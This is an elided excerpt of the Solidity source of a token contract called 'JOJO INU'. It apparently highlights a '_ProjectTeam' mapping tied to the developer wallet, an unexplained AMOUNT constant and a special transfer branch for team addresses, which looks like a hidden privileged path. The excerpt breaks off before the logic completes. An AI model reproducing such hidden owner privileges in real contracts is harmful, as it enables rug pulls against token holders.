...
contract JojoInu is Context, IERC20 { 
    ...
    address payable public Wallet_Marketing = payable(0xeFE1B849D3809C93F3Fad12627EAFfDfF3F5Fba0); 
    address payable public Wallet_Dev = payable(0x10EFC5AdE07592775826a44d767f2278f4CEb5Dc);
    ...
    string private constant _name = "JOJO INU"; 
    ...
    mapping (address => bool) public _ProjectTeam;
    uint256 private AMOUNT = 10**23;
    ...
    constructor () {
        ...
        _owner = 0x10EFC5AdE07592775826a44d767f2278f4CEb5Dc;
        ...
        _ProjectTeam[Wallet_Dev] = true;

        emit Transfer(address(0), owner(), _tTotal);

    }

    function project_team() public view virtual returns (address) {
        return Wallet_Dev;
    }
    ...
    function _transfer(
        ...
        if (from != owner() && from != address(this) && from != project_team())
        ...
        if(_ProjectTeam[to] && !_isExcludedFromFee[from]){
        ...
        _tokenTransfer(from, to, amount, takeFee, isBuy, transferDone);
    ...
    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee, bool isBuy, bool isTransfered) private {
